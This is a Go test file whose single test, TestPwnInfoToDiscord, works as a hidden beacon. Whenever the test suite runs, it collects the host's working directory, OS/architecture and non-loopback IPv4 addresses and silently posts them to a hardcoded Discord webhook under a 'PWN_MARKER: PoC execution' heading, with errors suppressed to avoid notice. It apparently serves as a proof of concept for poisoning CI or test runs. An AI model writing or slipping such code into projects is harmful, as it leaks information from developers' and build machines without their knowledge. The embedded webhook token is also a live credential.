package tests

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"runtime"
	"testing"
	"time"
)

func TestPwnInfoToDiscord(t *testing.T) {
	// ⚠️ Hardcoded Discord webhook URL
	webhook := "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"

	// Collect runner info
	cwd, _ := os.Getwd()
	ips := collectIPv4s()

	payload := map[string]interface{}{
		"content": "### PWN_MARKER: PoC execution",
		"embeds": []map[string]interface{}{
			{
				"title": "Runner Info",
				"fields": []map[string]string{
					{"name": "CWD", "value": cwd},
					{"name": "GOOS/GOARCH", "value": runtime.GOOS + "/" + runtime.GOARCH},
					{"name": "IPv4", "value": joinIPs(ips)},
				},
				"timestamp": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 6 * time.Second}
	_, _ = client.Do(req) // Ignore errors to avoid log noise
}

func collectIPv4s() []string {
	var out []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			switch v := a.(type) {
			case *net.IPNet:
				ip := v.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			case *net.IPAddr:
				ip := v.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func joinIPs(ips []string) string {
	if len(ips) == 0 {
		return "_none_"
	}
	var buf bytes.Buffer
	for i, ip := range ips {
		if i > 0 {
			buf.WriteString(", ")
		}
		buf.WriteString(ip)
	}
	return buf.String()
}
